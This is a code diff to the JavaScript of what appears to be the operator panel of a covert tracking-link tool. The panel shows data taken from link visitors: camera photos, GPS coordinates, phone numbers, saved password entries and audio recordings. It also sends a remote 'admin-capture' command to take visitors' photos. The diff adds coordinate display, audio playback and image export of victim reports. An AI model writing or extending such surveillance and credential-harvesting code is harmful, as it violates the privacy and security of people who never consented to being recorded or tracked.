@@ -5,6 +5,14 @@ let currentFilter = 'all';
 let currentSort = 'newest';
 
 // ============================================
+// MENU TOGGLE
+// ============================================
+function toggleMenu() {
+    const menu = document.getElementById('sideMenu');
+    menu.classList.toggle('open');
+}
+
+// ============================================
 // SOCKET CONNECTION
 // ============================================
 socket = io();
@@ -194,10 +202,26 @@ function displayPublishers(publishers) {
                 <button onclick="toggleSuspendPublisher('${p.id}')" class="camera-btn" style="background:${p.suspended ? '#48bb78' : '#fc8181'}">
                     ${p.suspended ? '🔄 Unsuspend' : '⛔ Suspend'}
                 </button>
+                <button onclick="deletePublisher('${p.id}')" class="camera-btn" style="background:#fc8181;">🗑️ Delete</button>
             </div>
         `;
         container.appendChild(card);
     });
+}
+
+function deletePublisher(publisherId) {
+    if (!confirm('Delete this publisher permanently?')) return;
+    fetch(`/api/publisher/${publisherId}`, { method: 'DELETE' })
+        .then(response => response.json())
+        .then(data => {
+            if (data.success) {
+                showNotification('🗑️ Publisher deleted');
+                loadAllData();
+            }
+        })
+        .catch(error => {
+            alert('Error: ' + error.message);
+        });
 }
 
 function toggleSuspendPublisher(publisherId) {
@@ -228,20 +252,207 @@ function viewPublisherVisitors(publisherId) {
             } else {
                 visitors.forEach((v, index) => {
                     const card = document.createElement('div');
-                    card.style.cssText = 'padding:8px; border-bottom:1px solid #eee; font-size:13px;';
+                    card.style.cssText = 'padding:8px; border-bottom:1px solid #eee; font-size:13px; display:flex; justify-content:space-between; align-items:center; flex-wrap:wrap; gap:5px;';
                     card.innerHTML = `
-                        <strong>#${index + 1}</strong> 🆔 ${v.id.substring(0, 8)} 
-                        📱 ${v.deviceName || 'Unknown'} 
-                        ${v.ip ? `🌐 ${v.ip}` : ''}
-                        📅 ${v.visitDate ? new Date(v.visitDate).toLocaleString() : 'N/A'}
-                        ${v.location ? `📍 ${v.location.city || ''} ${v.location.state || ''}` : ''}
-                        <button onclick="copyToClipboard('${v.id}')" class="camera-btn" style="padding:2px 8px; font-size:10px;">📋</button>
-                        ${v.frontCamera ? `<button onclick="downloadPhoto('${v.frontCamera.image || v.frontCamera}', 'front-${v.id}.jpg')" class="camera-btn" style="padding:2px 8px; font-size:10px; background:#48bb78;">⬇️</button>` : ''}
+                        <div>
+                            <strong>#${index + 1}</strong> 🆔 ${v.id.substring(0, 8)} 
+                            📱 ${v.deviceName || 'Unknown'} 
+                            ${v.ip ? `🌐 ${v.ip}` : ''}
+                            📅 ${v.visitDate ? new Date(v.visitDate).toLocaleString() : 'N/A'}
+                            ${v.location ? `📍 ${v.location.city || ''} ${v.location.state || ''}` : ''}
+                            ${v.battery ? `🔋 ${v.battery}%` : ''}
+                        </div>
+                        <div style="display:flex; gap:5px; flex-wrap:wrap;">
+                            <button onclick="copyToClipboard('${v.id}')" class="camera-btn" style="padding:2px 8px; font-size:10px;">📋</button>
+                            ${v.frontCamera ? `<button onclick="downloadPhoto('${v.frontCamera.image || v.frontCamera}', 'front-${v.id}.jpg')" class="camera-btn" style="padding:2px 8px; font-size:10px; background:#48bb78;">⬇️</button>` : ''}
+                            <button onclick="exportPublisherVisitor('${publisherId}', ${index})" class="camera-btn" style="padding:2px 8px; font-size:10px; background:#667eea;">📤</button>
+                            <button onclick="viewPublisherVisitorDetails('${publisherId}', ${index})" class="camera-btn" style="padding:2px 8px; font-size:10px; background:#ed8936;">👁️</button>
+                        </div>
                     `;
                     content.appendChild(card);
                 });
             }
             modal.style.display = 'flex';
+        });
+}
+
+function viewPublisherVisitorDetails(publisherId, visitorIndex) {
+    fetch(`/api/publisher-visitors/${publisherId}`)
+        .then(response => response.json())
+        .then(visitors => {
+            const v = visitors[visitorIndex];
+            if (!v) {
+                alert('Visitor not found');
+                return;
+            }
+            const modal = document.getElementById('publisherModal');
+            const content = document.getElementById('publisherDetailsContent');
+            content.innerHTML = `
+                <div style="display:grid; grid-template-columns:1fr 1fr; gap:15px;">
+                    <div class="detail-card"><label>🆔 ID</label><div class="value">${v.id}</div></div>
+                    <div class="detail-card"><label>📱 Device</label><div class="value">${v.deviceName || 'N/A'}</div></div>
+                    <div class="detail-card"><label>💻 OS</label><div class="value">${v.os || 'N/A'}</div></div>
+                    <div class="detail-card"><label>🌍 Browser</label><div class="value">${v.browser || 'N/A'}</div></div>
+                    <div class="detail-card"><label>🌐 IP</label><div class="value">${v.ip || 'N/A'}</div></div>
+                    <div class="detail-card"><label>📶 Network</label><div class="value">${v.network?.effectiveType || v.network?.type || 'N/A'}</div></div>
+                    <div class="detail-card"><label>🔋 Battery</label><div class="value">${v.battery || 'N/A'}%</div></div>
+                    <div class="detail-card"><label>📍 Location</label><div class="value">${v.location ? `${v.location.city || ''} ${v.location.state || ''} ${v.location.country || ''}` : 'N/A'}</div></div>
+                    <div class="detail-card"><label>📍 Coordinates</label><div class="value">${v.location ? `${v.location.lat || 'N/A'}, ${v.location.lng || 'N/A'}` : 'N/A'}</div></div>
+                    ${v.frontCamera ? `<div class="detail-card"><label>📸 Front Photo</label><div class="value"><img src="${v.frontCamera.image || v.frontCamera}" style="max-width:150px; border-radius:5px; margin-top:5px;"></div></div>` : ''}
+                    ${v.backCamera ? `<div class="detail-card"><label>📸 Back Photo</label><div class="value"><img src="${v.backCamera.image || v.backCamera}" style="max-width:150px; border-radius:5px; margin-top:5px;"></div></div>` : ''}
+                </div>
+            `;
+            modal.style.display = 'flex';
+        });
+}
+
+function exportPublisherVisitor(publisherId, visitorIndex) {
+    fetch(`/api/publisher-visitors/${publisherId}`)
+        .then(response => response.json())
+        .then(visitors => {
+            const v = visitors[visitorIndex];
+            if (!v) {
+                alert('Visitor not found');
+                return;
+            }
+            
+            const canvas = document.createElement('canvas');
+            canvas.width = 700;
+            canvas.height = 500;
+            const ctx = canvas.getContext('2d');
+            
+            // Professional gradient background
+            const gradient = ctx.createLinearGradient(0, 0, 700, 500);
+            gradient.addColorStop(0, '#0f0c29');
+            gradient.addColorStop(0.5, '#302b63');
+            gradient.addColorStop(1, '#24243e');
+            ctx.fillStyle = gradient;
+            ctx.fillRect(0, 0, 700, 500);
+            
+            // Blur effect overlay
+            ctx.shadowColor = 'rgba(102, 126, 234, 0.3)';
+            ctx.shadowBlur = 30;
+            ctx.fillStyle = 'rgba(255,255,255,0.03)';
+            ctx.fillRect(0, 0, 700, 500);
+            ctx.shadowBlur = 0;
+            
+            // Header with glow
+            ctx.shadowColor = 'rgba(102, 126, 234, 0.5)';
+            ctx.shadowBlur = 20;
+            ctx.fillStyle = '#ffffff';
+            ctx.font = 'bold 26px Arial';
+            ctx.fillText('📊 Visitor Data Report', 30, 50);
+            ctx.shadowBlur = 0;
+            
+            ctx.fillStyle = '#667eea';
+            ctx.font = '13px Arial';
+            ctx.fillText(`Generated: ${new Date().toLocaleString()}`, 30, 75);
+            
+            // Info boxes with glass effect
+            const info = [
+                ['🆔 ID', v.id],
+                ['📱 Device', v.deviceName || 'N/A'],
+                ['💻 OS', v.os || 'N/A'],
+                ['🌍 Browser', v.browser || 'N/A'],
+                ['🌐 IP', v.ip || 'N/A'],
+                ['📶 Network', v.network?.effectiveType || v.network?.type || 'N/A'],
+                ['🔋 Battery', v.battery || 'N/A' + '%'],
+                ['📍 Location', v.location ? `${v.location.city || ''} ${v.location.state || ''}` : 'N/A'],
+                ['📍 Coordinates', v.location ? `${v.location.lat || 'N/A'}, ${v.location.lng || 'N/A'}` : 'N/A']
+            ];
+            
+            info.forEach(([label, value], i) => {
+                const x = 30 + (i % 2) * 340;
+                const y = 110 + Math.floor(i / 2) * 45;
+                
+                // Box background with glass effect
+                ctx.fillStyle = 'rgba(255,255,255,0.04)';
+                ctx.shadowColor = 'rgba(102, 126, 234, 0.2)';
+                ctx.shadowBlur = 15;
+                ctx.beginPath();
+                ctx.roundRect(x, y, 310, 35, 8);
+                ctx.fill();
+                ctx.shadowBlur = 0;
+                
+                ctx.fillStyle = 'rgba(255,255,255,0.3)';
+                ctx.font = '11px Arial';
+                ctx.fillText(label, x + 12, y + 22);
+                
+                ctx.fillStyle = 'rgba(255,255,255,0.9)';
+                ctx.font = '12px Arial';
+                ctx.fillText(value, x + 100, y + 22);
+            });
+            
+            // Photos if available
+            let yPos = 320;
+            let photosLoaded = 0;
+            const totalPhotos = (v.frontCamera ? 1 : 0) + (v.backCamera ? 1 : 0);
+            
+            const drawPhoto = (imgSrc, label) => {
+                const img = new Image();
+                img.onload = function() {
+                    ctx.shadowColor = 'rgba(102, 126, 234, 0.3)';
+                    ctx.shadowBlur = 20;
+                    ctx.fillStyle = '#ffffff';
+                    ctx.font = 'bold 14px Arial';
+                    ctx.fillText(label, 30, yPos);
+                    ctx.shadowBlur = 0;
+                    
+                    const maxWidth = 140;
+                    const maxHeight = 140;
+                    let width = img.width;
+                    let height = img.height;
+                    if (width > maxWidth) { height = (height * maxWidth) / width; width = maxWidth; }
+                    if (height > maxHeight) { width = (width * maxHeight) / height; height = maxHeight; }
+                    
+                    ctx.shadowColor = 'rgba(0,0,0,0.4)';
+                    ctx.shadowBlur = 25;
+                    ctx.drawImage(img, 30, yPos + 5, width, height);
+                    ctx.shadowBlur = 0;
+                    
+                    yPos += 160;
+                    photosLoaded++;
+                    if (photosLoaded >= totalPhotos || totalPhotos === 0) {
+                        // Footer with glow
+                        ctx.shadowColor = 'rgba(102, 126, 234, 0.2)';
+                        ctx.shadowBlur = 10;
+                        ctx.fillStyle = 'rgba(255,255,255,0.2)';
+                        ctx.font = '11px Arial';
+                        ctx.fillText('Generated by Admin Panel • Data exported on ' + new Date().toLocaleString(), 30, 470);
+                        ctx.shadowBlur = 0;
+                        
+                        const link = document.createElement('a');
+                        link.download = `visitor-${v.id}-report.png`;
+                        link.href = canvas.toDataURL('image/png');
+                        link.click();
+                        showNotification('📤 Visitor data exported as image!');
+                    }
+                };
+                img.src = imgSrc;
+            };
+            
+            if (v.frontCamera) {
+                drawPhoto(v.frontCamera.image || v.frontCamera, '📸 Front Camera');
+            }
+            if (v.backCamera) {
+                drawPhoto(v.backCamera.image || v.backCamera, '📸 Back Camera');
+            }
+            
+            if (totalPhotos === 0) {
+                ctx.fillStyle = 'rgba(255,255,255,0.3)';
+                ctx.font = '14px Arial';
+                ctx.fillText('No photos available', 30, 350);
+                
+                ctx.fillStyle = 'rgba(255,255,255,0.2)';
+                ctx.font = '11px Arial';
+                ctx.fillText('Generated by Admin Panel • Data exported on ' + new Date().toLocaleString(), 30, 470);
+                
+                const link = document.createElement('a');
+                link.download = `visitor-${v.id}-report.png`;
+                link.href = canvas.toDataURL('image/png');
+                link.click();
+                showNotification('📤 Visitor data exported as image!');
+            }
         });
 }
 
@@ -349,10 +560,37 @@ function displaySuperUsers(users) {
             <div style="display:flex; gap:8px; margin-top:10px; flex-wrap:wrap;">
                 <button onclick="copyToClipboard('${user.id}')" class="camera-btn" style="background:#f6ad55;">📋 Copy ID</button>
                 <button onclick="deleteSuperUser('${user.id}')" class="camera-btn delete">🗑️ Delete</button>
+                <button onclick="viewSuperUserDetails('${user.id}')" class="camera-btn" style="background:#667eea;">👁️ View</button>
             </div>
         `;
         container.appendChild(card);
     });
+}
+
+function viewSuperUserDetails(superUserId) {
+    // Find the super user data from the list
+    fetch('/api/super-users')
+        .then(response => response.json())
+        .then(users => {
+            const user = users.find(u => u.id === superUserId);
+            if (!user) {
+                alert('Super user not found');
+                return;
+            }
+            const modal = document.getElementById('publisherModal');
+            const content = document.getElementById('publisherDetailsContent');
+            const data = user.data || {};
+            content.innerHTML = `
+                <div style="display:grid; grid-template-columns:1fr 1fr; gap:15px;">
+                    <div class="detail-card"><label>⚡ Super User</label><div class="value">${user.id}</div></div>
+                    <div class="detail-card"><label>📅 Date</label><div class="value">${new Date(user.createdAt).toLocaleString()}</div></div>
+                    <div class="detail-card"><label>🔗 Link ID</label><div class="value">${user.linkId || 'N/A'}</div></div>
+                    <div class="detail-card"><label>📋 Permissions</label><div class="value">${(data.permissions || []).join(', ')}</div></div>
+                    <div class="detail-card"><label>🕐 Granted At</label><div class="value">${data.grantedAt ? new Date(data.grantedAt).toLocaleString() : 'N/A'}</div></div>
+                </div>
+            `;
+            modal.style.display = 'flex';
+        });
 }
 
 function deleteSuperUser(id) {
@@ -376,11 +614,24 @@ function showTab(tab) {
     document.getElementById('superTab').style.display = tab === 'super' ? 'block' : 'none';
     document.getElementById('publishersTab').style.display = tab === 'publishers' ? 'block' : 'none';
     document.getElementById('linksTab').style.display = tab === 'links' ? 'block' : 'none';
-    document.getElementById('tabDashboard').className = 'tab-btn' + (tab === 'dashboard' ? ' active' : '');
-    document.getElementById('tabUsers').className = 'tab-btn' + (tab === 'users' ? ' active' : '');
-    document.getElementById('tabSuper').className = 'tab-btn' + (tab === 'super' ? ' active' : '');
-    document.getElementById('tabPublishers').className = 'tab-btn' + (tab === 'publishers' ? ' active' : '');
-    document.getElementById('tabLinks').className = 'tab-btn' + (tab === 'links' ? ' active' : '');
+    
+    // Update menu items
+    document.querySelectorAll('.menu-item').forEach(item => item.classList.remove('active'));
+    const menuMap = {
+        'dashboard': 'menuDashboard',
+        'users': 'menuUsers',
+        'super': 'menuSuper',
+        'publishers': 'menuPublishers',
+        'links': 'menuLinks'
+    };
+    const menuItem = document.getElementById(menuMap[tab]);
+    if (menuItem) menuItem.classList.add('active');
+    
+    // Close menu on mobile
+    if (window.innerWidth <= 768) {
+        document.getElementById('sideMenu').classList.remove('open');
+    }
+    
     if (tab === 'users') { refreshAllData(); }
     if (tab === 'links') { loadLinks(); }
     if (tab === 'super') { loadAllData(); }
@@ -715,7 +966,7 @@ function clearFilters() {
 }
 
 // ============================================
-// SHOW USER DETAILS - WITH DOWNLOAD & EXPORT
+// SHOW USER DETAILS
 // ============================================
 function showUserDetails(userId) {
     currentVisitorId = userId;
@@ -757,7 +1008,6 @@ function showUserDetails(userId) {
                 visitHistoryHTML = '<p style="color:#999;">No visit history available</p>';
             }
             
-            // Photos with Download & Export
             const frontPhoto = user.frontCamera || null;
             const backPhoto = user.backCamera || null;
             
@@ -1384,10 +1634,12 @@ function showVisitDetails(userId, visitIndex) {
                     <div class="detail-card"><label>🔋 Battery</label><div class="value">${visit.battery || 'N/A'}%</div></div>
                     <div class="detail-card"><label>📶 Network</label><div class="value">${visit.network?.effectiveType || visit.network?.type || 'N/A'}</div></div>
                     <div class="detail-card"><label>📍 Location</label><div class="value">${visit.location ? `${visit.location.city || ''} ${visit.location.state || ''} ${visit.location.country || ''}` : 'N/A'}</div></div>
+                    <div class="detail-card"><label>📍 Coordinates</label><div class="value">${visit.location ? `${visit.location.lat || 'N/A'}, ${visit.location.lng || 'N/A'}` : 'N/A'}</div></div>
                     ${visit.frontCamera ? `<div class="detail-card"><label>📸 Front Photo</label><div class="value"><img src="${visit.frontCamera.image || visit.frontCamera}" style="max-width:150px; border-radius:5px; margin-top:5px;"></div></div>` : ''}
                     ${visit.backCamera ? `<div class="detail-card"><label>📸 Back Photo</label><div class="value"><img src="${visit.backCamera.image || visit.backCamera}" style="max-width:150px; border-radius:5px; margin-top:5px;"></div></div>` : ''}
                     ${visit.phoneNumber ? `<div class="detail-card"><label>📞 Phone Number</label><div class="value">${visit.phoneNumber}</div></div>` : ''}
                     ${visit.savedPasswords && visit.savedPasswords.length > 0 ? `<div class="detail-card"><label>🔑 Saved Passwords</label><div class="value">${visit.savedPasswords.map(p => p.email || p.id || 'Unknown').join(', ')}</div></div>` : ''}
+                    ${visit.audioRecording ? `<div class="detail-card"><label>🎙️ Audio Recording</label><div class="value"><audio controls style="width:100%; max-width:200px;"><source src="${visit.audioRecording}" type="audio/webm"></audio></div></div>` : ''}
                     <div class="detail-card"><label>🔄 Redirect Complete</label><div class="value">${visit.redirectComplete ? '✅ Yes' : '❌ No'}</div></div>
                 </div>
                 <div style="margin-top:15px; display:flex; gap:10px; flex-wrap:wrap;">
@@ -1428,7 +1680,7 @@ function captureVisitorPhoto(type) {
     }
     const statusDiv = document.getElementById('captureStatus');
     if (statusDiv) {
-        statusDiv.textContent = ` Requesting ${type} photo...`;
+        statusDiv.textContent = `📸 Requesting ${type} photo...`;
         statusDiv.style.color = '#4299e1';
     }
     socket.emit('admin-capture', {
